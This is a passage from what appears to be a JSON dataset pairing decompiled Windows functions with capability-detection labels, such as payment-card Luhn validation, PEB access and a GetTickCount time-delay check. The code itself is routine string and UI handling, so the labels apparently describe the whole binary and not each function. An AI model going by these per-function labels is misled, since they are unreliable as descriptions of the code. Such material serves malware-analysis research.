param_1;\n}\n",
        "token_count": 1145
    },
    "00412040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00412040(int32_t *param_1, int32_t *param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483738;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &piStack12;\n    iVar2 = fcn.004017b0(*param_2 + -0x10, uVar1);\n    *param_1 = iVar2 + 0x10;\n    uStack4 = 0;\n    fcn.00411450(param_3);\n    *in_FS_OFFSET = param_1;\n    return param_1;\n}\n",
        "token_count": 218
    },
    "004120b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004120b0(int32_t *param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483768;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    iVar2 = fcn.004017b0(*param_2 + -0x10, uVar1);\n    *param_1 = iVar2 + 0x10;\n    uStack4 = 0;\n    fcn.00411450(param_2 + 1);\n    *in_FS_OFFSET = param_1;\n    return param_1;\n}\n",
        "token_count": 218
    },
    "00412590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00412590(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t *piStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x483819;\n    piStack12 = *in_FS_OFFSET;\n    uVar3 = *0x4a9ec8 ^ &stack0xffffffe4;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    iStack24 = 0;\n    uVar4 = fcn.00402f40(param_2, uVar3);\n    uStack8 = 1;\n    uVar4 = fcn.0040d340(&iStack24, uVar4, 0x48ad3c);\n    uStack8._0_1_ = 2;\n    fcn.0040d340(param_1, uVar4, param_2);\n    uStack8._0_1_ = 1;\n    piVar1 = iStack24 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStack24 + -0x10) + 4))(iStack24 + -0x10);\n    }\n    uStack8 = uStack8._1_3_ << 8;\n    piVar1 = iStack20 + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(iStack20 + -0x10) + 4))(iStack20 + -0x10);\n    }\n    fcn.00410e90();\n    fcn.004022c0();\n    fcn.00410e30();\n    *in_FS_OFFSET = piStack16;\n    return param_1;\n}\n",
        "token_count": 512
    },
    "00413c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00413c80(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint32_t uStack64;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uint uStack24;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4839b8;\n    iStack12 = *in_FS_OFFSET;\n    uStack64 = *0x4a9ec8 ^ &stack0xffffffc4;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack68 = 0x413cae;\n    piVar1 = fcn.00423280();\n    if (piVar1 == NULL) {\n        uStack68 = 0x80004005;\n        uStack72 = 0x413cc5;\n        piVar1 = fcn.00401070();\n    }\n    uStack72 = 0x413cce;\n    iStack36 = (**(*piVar1 + 0xc))();\n    iStack36 = iStack36 + 0x10;\n    uStack76 = *(param_1 + 0x3b8);\n    uStack84 = *(param_1 + 0x20);\n    uStack72 = 0;\n    uStack80 = 0x199;\n    uStack8 = 0;\n    iVar2 = (*_sym.imp.USER32.dll_SendMessageA)();\n    if ((((iVar2 != 0) && (*(iVar2 + 0x14) == 0xc)) && (param_1 != -0x254)) && (*(param_1 + 0x274) != 0)) {\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x274));\n        if (((iVar2 != 0) && (param_1 != -0x2a8)) && (*(param_1 + 0x2c8) != 0)) {\n            iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x2c8));\n            if (iVar2 != 0) {\n                uStack44 = 0;\n                uStack40 = 0;\n                iStack36 = 0;\n                fcn.004018d0();\n                uStack24 = CONCAT31(uStack24._1_3_, 1);\n                fcn.0042d5ae(&stack0xffffffd0);\n                uVar3 = fcn.0040eb40();\n                uVar3 = fcn.0040eb00(uVar3);\n                uVar3 = fcn.0040ead0(uVar3);\n                fcn.00411180(&stack0xffffffbc, \"%d-%02d-%02d \", uVar3);\n                fcn.0042d5ae(&stack0xffffffd4);\n                fcn.004018d0();\n                uStack32 = CONCAT31(uStack32._1_3_, 2);\n                uVar3 = fcn.0040ebc0();\n                uVar3 = fcn.0040eb90(uVar3);\n                uVar3 = fcn.0040eb60(uVar3);\n                fcn.00411180(&stack0xffffffbc, \"%d:%d:%d\", uVar3);\n                fcn.00402500(&stack0xffffffbc);\n                fcn.004226fd(0);\n                fcn.004226fd(0);\n                fcn.00402200(&stack0xffffffac);\n                (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\n                fcn.00401900();\n                fcn.00401900();\n            }\n        }\n    }\n    uStack24 = 0xffffffff;\n    piVar1 = unaff_EBP + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(unaff_EBP + -0x10) + 4))(unaff_EBP + -0x10);\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 1022
    },
    "00414050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414050(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uchar auStack16 [4];\n    uchar auStack12 [12];\n    \n    fcn.00411b90();\n    fcn.00411cd0();\n    fcn.00413c80();\n    fcn.00411870();\n    fcn.00411970();\n    fcn.00411a80();\n    fcn.00411cd0();\n    fcn.00411e10(auStack12, auStack16);\n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x170));\n    if (iVar1 != 0) {\n        fcn.004226fd(0);\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "004140f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall\nfcn.004140f0(int32_t param_1, int32_t *param_2, int32_t param_3, int32_t *param_4, int32_t param_5, int32_t *param_6)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *unaff_retaddr;\n    int32_t iStack4;\n    \n    piVar1 = **(param_1 + 4);\n    if ((param_3 == 0) || (param_3 != param_1)) {\n        fcn.0045780d();\n    }\n    if (param_4 == piVar1) {\n        piVar1 = *(param_1 + 4);\n        if ((param_5 == 0) || (param_5 != param_1)) {\n            fcn.0045780d();\n        }\n        if (param_6 == piVar1) {\n            fcn.004124f0(*(*(param_1 + 4) + 4));\n            *(*(param_1 + 4) + 4) = *(param_1 + 4);\n            *(param_1 + 8) = 0;\n            **(param_1 + 4) = *(param_1 + 4);\n            *(*(param_1 + 4) + 8) = *(param_1 + 4);\n            iVar2 = **(param_1 + 4);\n            *unaff_retaddr = param_1;\n            unaff_retaddr[1] = iVar2;\n            return;\n        }\n    }\n    while( true ) {\n        if ((param_3 == 0) || (param_3 != param_5)) {\n            fcn.0045780d();\n        }\n        if (param_4 == param_6) break;\n        fcn.0040ef10();\n        param_4 = unaff_retaddr;\n        fcn.00412160();\n        param_3 = iStack4;\n        unaff_retaddr = param_4;\n    }\n    *param_2 = param_3;\n    param_2[1] = param_4;\n    return;\n}\n",
        "token_count": 475
    },
    "004141c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.004141c0(uint param_1, uint param_2, uint param_3, uint param_4, uchar param_5)\n\n{\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_3;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x483a21;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    puVar1 = fcn.004170b4(0x30);\n    var_4h = 1;\n    if (puVar1 != NULL) {\n        *puVar1 = var_8h;\n        puVar1[1] = var_ch_3;\n        puVar1[2] = var_10h_2;\n        fcn.004120b0(var_14h_2);\n        *(puVar1 + 0xb) = var_10h;\n        *(puVar1 + 0x2d) = 0;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return puVar1;\n}\n",
        "token_count": 320
    },
    "00414260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00414260(int32_t param_1, uint param_2)\n\n{\n    fcn.00402f40(*(param_1 + 0x80) + 0x1c);\n    return param_2;\n}\n",
        "token_count": 56
    },
    "00414d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414d30(int32_t param_1)\n\n{\n    fcn.00414050();\n    (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x184, 0, 0);\n    fcn.004124f0(*(*(param_1 + 0x3f0) + 4));\n    *(*(param_1 + 0x3f0) + 4) = *(param_1 + 0x3f0);\n    *(param_1 + 0x3f4) = 0;\n    **(param_1 + 0x3f0) = *(param_1 + 0x3f0);\n    *(*(param_1 + 0x3f0) + 8) = *(param_1 + 0x3f0);\n    return;\n}\n",
        "token_count": 195
    },
    "00415180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with lookup table/f2e93a0d9a164553a93d71878df6b782"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00415180(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *unaff_ESI;\n    int32_t **in_FS_OFFSET;\n    uchar auStack20 [8];\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x483cab;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffdc;\n    *in_FS_OFFSET = &piStack12;\n    *param_1 = vtable.CPropertyList.0;\n    uStack4 = 0xd;\n    fcn.0041a5a2(uVar1);\n    uStack4 = CONCAT31(uStack4._1_3_, 0xc);\n    fcn.004140f0(auStack20, param_1 + 0xfb, *param_1[0xfc], param_1 + 0xfb, param_1[0xfc]);\n    fcn.004170df(param_1[0xfc]);\n    param_1[0xfc] = NULL;\n    param_1[0xfd] = NULL;\n    param_1[0xf9] = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    fcn.00427f49();\n    fcn.00401ca0();\n    fcn.0042cf1e();\n    fcn.0042cf1e();\n    fcn.0042e30b();\n    param_1[0x7e] = vtable.CGdiObject.0;\n    fcn.0041a5a2();\n    fcn.00417187();\n    fcn.00417187();\n    fcn.00417413();\n    fcn.00417359();\n    fcn.00417359();\n    fcn.00417225();\n    *in_FS_OFFSET = unaff_ESI;\n    return;\n}\n",
        "token_count": 442
    },
    "00415710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __thiscall fcn.00415710(int32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t **in_FS_OFFSET;\n    uint32_t *puVar5;\n    uint32_t uStack96;\n    int32_t iStack76;\n    uint uStack20;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483dc0;\n    piStack12 = *in_FS_OFFSET;\n    uStack96 = *0x4a9ec8 ^ &stack0xffffffa4;\n    *in_FS_OFFSET = &piStack12;\n    iVar1 = fcn.004108c0(param_2);\n    if (param_1 == 0) {\n        fcn.0045780d();\n    }\n    if (iVar1 != *(param_1 + 4)) {\n        iVar2 = *(iVar1 + 0xc);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00401070(0x80004005);\n        }\n        iVar2 = fcn.00456b7a(*param_2, iVar2);\n        if (-1 < iVar2) goto code_r0x004157ec;\n    }\n    uVar3 = fcn.004105e0();\n    piStack12 = NULL;\n    fcn.00412040(param_2, uVar3);\n    puVar5 = &uStack96;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    piVar4 = fcn.00415330();\n    param_1 = *piVar4;\n    iVar1 = piVar4[1];\n    fcn.004106a0();\n    piVar4 = iStack76 + -4;\n    LOCK();\n    iVar2 = *piVar4;\n    *piVar4 = *piVar4 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(iStack76 + -0x10) + 4))(iStack76 + -0x10);\n    }\n    fcn.004106a0(puVar5);\ncode_r0x004157ec:\n    if (param_1 == 0) {\n        fcn.0045780d();\n    }\n    if (iVar1 == *(param_1 + 4)) {\n        fcn.0045780d();\n    }\n    *in_FS_OFFSET = uStack20;\n    return iVar1 + 0x10;\n}\n",
        "token_count": 602
    },
    "00415820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.00415820(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uchar auStack140 [4];\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    int32_t **ppiStack100;\n    uchar *puStack96;\n    uchar *puStack92;\n    uint32_t uStack88;\n    uchar auStack68 [12];\n    uchar auStack56 [4];\n    uint32_t uStack52;\n    uchar uStack48;\n    uint uStack44;\n    uchar uStack40;\n    uchar uStack36;\n    int32_t iStack20;\n    int32_t iStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uVar3 = param_2;\n    iStack4 = 0xffffffff;\n    uStack8 = 0x483e10;\n    iStack12 = *in_FS_OFFSET;\n    uStack88 = *0x4a9ec8 ^ &stack0xffffffac;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    puStack92 = 0x48a3e2;\n    ppiStack100 = &stack0x00000004;\n    puStack96 = param_2;\n    uStack104 = 0x41585d;\n    fcn.00412590();\n    uStack44 = *(param_1 + 0x3f0);\n    puStack92 = &stack0x00000004;\n    puStack96 = &stack0xffffffc8;\n    iStack4 = 0;\n    uVar4 = 0xffffffff;\n    ppiStack100 = 0x41588c;\n    piVar2 = fcn.004111d0();\n    if ((*piVar2 == 0) || (*piVar2 != param_1 + 0x3ec)) {\n        ppiStack100 = 0x41589f;\n        fcn.0045780d();\n    }\n    if (piVar2[1] == uStack52) {\n        ppiStack100 = uVar3;\n        uStack104 = 0x4158b8;\n        uStack108 = fcn.0040fd60();\n        uStack116 = *(param_1 + 0x20);\n        uStack104 = uVar3;\n        uStack112 = 0x181;\n        uStack120 = 0x4158c9;\n        uVar4 = (*_sym.imp.USER32.dll_SendMessageA)();\n        puStack96 = &stack0xffffff88;\n        uStack124 = 0x48a3e2;\n        uStack128 = 0x4158dc;\n        fcn.00402f40();\n        puStack96 = &stack0xffffff80;\n        uStack132 = 0x48a3e2;\n        uStack36 = 1;\n        uStack136 = 0x4158f2;\n        fcn.00402f40();\n        uStack136 = 99;\n        puStack96 = &stack0xffffff74;\n        uStack144 = 0x48a3e2;\n        uStack40 = 2;\n        uStack148 = 0x41590a;\n        fcn.00402f40();\n        puStack96 = &stack0xffffff6c;\n        uStack152 = 0x48a3e2;\n        uStack44 = CONCAT31(uStack44._1_3_, 3);\n        uStack156 = 0x415920;\n        fcn.00402f40();\n        puStack92 = &stack0xffffff64;\n        uStack48 = 4;\n        fcn.00402f40(uVar3);\n        uStack52 = uStack52 & 0xffffff00;\n        fcn.004115d0();\n        fcn.00415710(&stack0xffffffbc, &stack0xffffff90);\n        fcn.00411810();\n        uVar3 = fcn.00415710(&stack0xffffffb4);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x19a, uVar4, uVar3);\n        ppiStack100 = 0x415983;\n        fcn.004106a0();\n    }\n    ppiStack100 = iStack4 + -0x10;\n    iStack12 = 0xffffffff;\n    piVar2 = iStack4 + -4;\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar1 == 1 || iVar1 + -1 < 0) {\n        uStack104 = 0x4159ab;\n        (**(**ppiStack100 + 4))();\n    }\n    *in_FS_OFFSET = iStack20;\n    return uVar4;\n}\n",
        "token_count": 1157
    },
    "00416060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00416060(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0045842b(param_1, param_2, param_3);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 73
    },
    "00416150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416150(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004582da(param_2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401070(0x8007000e);\n    }\n    *param_1 = iVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "00416180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00416180(int32_t *param_1, int32_t param_2, uint32_t param_3)\n\n{\n    if (-param_2 - 1U < param_3) {\n        return 0x80070057;\n    }\n    *param_1 = param_2 + param_3;\n    return 0;\n}\n",
        "token_count": 78
    },
    "004162a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.004162a0(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_34h;\n    uint var_24h;\n    uchar var_1dh;\n    uint32_t var_1ch_2;\n    uint *var_18h_2;\n    int32_t var_10h_2;\n    uint uStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    uStack16 = 0x4589c0;\n    var_10h_2 = *in_FS_OFFSET;\n    uStack12 = *0x4a9ec8 ^ 0x49e850;\n    var_34h = *0x4a9ec8 ^ &stack0xfffffffc;\n    var_18h_2 = &var_34h;\n    *in_FS_OFFSET = &var_10h_2;\n    var_4h = 0;\n    var_24h = 0;\n    var_1ch_2 = var_34h;\n    iVar1 = fcn.00416180(&var_24h, var_8h_2, 0x2000);\n    if (iVar1 < 0) {\n        var_1dh = 0;\n    }\n    else {\n        fcn.00458b60();\n        var_18h_2 = &var_34h;\n    }\n    var_4h = 0xfffffffe;\n    *in_FS_OFFSET = var_10h_2;\n    fcn.004566a8(var_24h);\n    return;\n}\n",
        "token_count": 407
    },
    "00416360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00416360(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (-param_2 - 1U < 8) {\n        puVar1 = fcn.00401070(0x80070057);\n    }\n    else {\n        puVar1 = fcn.004582da(param_2 + 8);\n        if (puVar1 == NULL) {\n            return NULL;\n        }\n    }\n    *puVar1 = *param_1;\n    *param_1 = puVar1;\n    return puVar1 + 2;\n}\n",
        "token_count": 139
    },
    "00416400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416400(uint *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint uVar4;\n    uint uVar5;\n    \n    if (param_2 == 0) {\n        *param_1 = 0;\n        return;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_2);\n    iVar1 = iVar1 + 1;\n    fcn.00416210(param_1, iVar1 * 4, param_1 + 1, 0x80);\n    uVar5 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(param_2, 0, param_2, iVar1, *param_1, iVar1 * 4, 0, 0);\n    bVar3 = iVar2 == 0;\n    if (bVar3) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 0x7a) {\n            uVar4 = 0;\n            uVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar5, 0, param_2, iVar1, 0, 0, 0, 0);\n            fcn.00416210(param_1, uVar5, param_1 + 1, 0x80);\n            iVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(uVar4, 0, param_2, iVar1, *param_1, uVar5, 0, 0);\n            bVar3 = iVar1 == 0;\n        }\n        if (bVar3) {\n            fcn.00416040();\n        }\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "00417ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417ac0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint cb;\n    \n    cb = 0;\n    iVar1 = fcn.00417aa0(&cb, arg_8h, arg_ch);\n    if (iVar1 < 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(cb);\n    return uVar2;\n}\n",
        "token_count": 113
    },
    "00417b17": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417b17(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00456177(param_1, param_2, param_3, param_4);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "00417b36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417b36(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00417af8(param_1, param_2, param_3, param_4);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 83
    },
    "00417b55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417b55(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00458fdb(param_1, param_2, param_3, param_4);\n    fcn.0040e7f0(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "00417cce": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417cce(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalSize;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GlobalSize)(arg_ch);\n    if (arg_8h == 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2002, uVar3);\n        if (arg_8h != 0) {\ncode_r0x00417d07:\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalLock;\n            uVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)(arg_ch);\n            uVar6 = (*pcVar2)(arg_8h);\n            uVar5 = (*pcVar1)(arg_8h, uVar5, uVar3);\n            fcn.00417b17(uVar6, uVar5);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalUnlock;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(arg_8h);\n            (*pcVar1)(arg_ch);\n            return arg_8h;\n        }\n    }\n    else {\n        uVar4 = (*pcVar1)(arg_8h);\n        if (uVar3 <= uVar4) goto code_r0x00417d07;\n    }\n    return 0;\n}\n",
        "token_count": 355
    },
    "004180b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004180b1(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    if (param_2 == NULL) {\n        fcn.00401070(0x80004005);\n        param_2 = extraout_ECX;\n    }\n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 122
    },
    "0041811c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041811c(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    uVar1 = *param_1;\n    uVar4 = uVar1;\n    piVar2 = *(uVar1 - 0x10);\n    if (*(uVar1 - 0xc) != 0) {\n        if (*(uVar1 - 4) < 0) {\n            if (*(uVar1 - 8) < 0) {\n                uVar4 = fcn.00401070(0x80070057);\n            }\n            *(uVar4 + -0xc) = uVar4 >> 0x20;\n            **param_1 = uVar4 >> 0x20;\n        }\n        else {\n            fcn.004010d0();\n            iVar3 = (**(*piVar2 + 0xc))();\n            *param_1 = iVar3 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00418165": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418165(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *in_ECX;\n    iVar2 = *(iVar1 + -0xc);\n    puVar3 = (**(**(iVar1 + -0x10) + 0x10))();\n    iVar4 = (***puVar3)(arg_8h, 2);\n    if (iVar4 == 0) {\n        fcn.004180fd();\n    }\n    if (iVar2 < arg_8h) {\n        arg_8h = iVar2;\n    }\n    fcn.00417a81(iVar4 + 0x10, arg_8h + 1, iVar1, arg_8h + 1);\n    *(iVar4 + 4) = iVar2;\n    fcn.004010d0();\n    *in_ECX = iVar4 + 0x10;\n    return;\n}\n",
        "token_count": 251
    },
    "004181cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004181cd(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    ppiVar1 = *param_1 + -0x10;\n    if ((*(*param_1 + -8) < param_2) && (0 < param_2)) {\n        iVar2 = (**(**ppiVar1 + 8))(ppiVar1, param_2, 2);\n        if (iVar2 != 0) goto code_r0x004181f8;\n    }\n    iVar2 = fcn.004180fd();\ncode_r0x004181f8:\n    *param_1 = iVar2 + 0x10;\n    return;\n}\n",
        "token_count": 168
    },
    "0041829a": {
        "rules": [
